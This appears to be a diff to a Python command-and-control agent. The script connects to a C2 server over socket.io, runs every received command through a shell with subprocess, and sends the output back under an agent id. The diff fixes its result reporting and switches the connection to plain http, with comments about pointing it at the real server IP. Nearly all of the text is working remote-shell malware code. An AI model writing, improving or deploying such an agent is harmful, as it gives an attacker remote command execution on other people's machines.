@@ -17,7 +17,7 @@ agent_id = str(uuid.uuid4())
 def connect():
     # When connection to the C2 server is successful
     print("[+] Connected to C2.")
-    sio.emit('exec_result', {'id': agent_id, 'output': 'Connected successfully'})
+    sio.emit('exec_result', {'id': agent_id, 'output': 'Agent Connected to C2 Successfully'})
 
 @sio.event
 def disconnect():
@@ -29,10 +29,12 @@ def on_command(cmd):
     try:
         # Execute the command
         output = subprocess.check_output(cmd, shell=True, text=True)
+        result = output
     except Exception as e:
         result = f"Error: {e}"
-    sio.emit('output', result)
+    sio.emit('exec_result', {'id': agent_id, 'output': result})
 
 # Connect to the C2 server (replace 127.0.0.1 with actual IP)
-sio.connect('https://127.0.0.1:5000')
+# change to https and 443 once the cert function is rectified. ⚠️
+sio.connect('http://127.0.0.1:5000')
 sio.wait()
